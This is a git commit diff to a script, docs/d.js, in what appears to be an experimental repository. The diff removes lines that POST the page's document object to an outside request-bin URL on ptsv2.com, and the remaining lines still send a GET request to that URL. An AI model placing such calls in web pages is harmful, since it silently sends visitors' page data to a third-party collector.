b4598ff9ede9abe48c65809c049e8f74b344c364
testy7 <97352957+testy7@users.noreply.github.com>
2022-01-08 18:03:14 +0100

    Update d.js

--- docs/d.js
+++ docs/d.js
@@ -6,6 +6,3 @@ const url = 'https://ptsv2.com/t/fyrw2-1641653611/post';
 xhr.open('GET', url);
 xhr.send();
 
-xhr.open("POST", 'https://ptsv2.com/t/fyrw2-1641653611/post', true);
-xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://ptsv2.com');
-xhr.send(document);
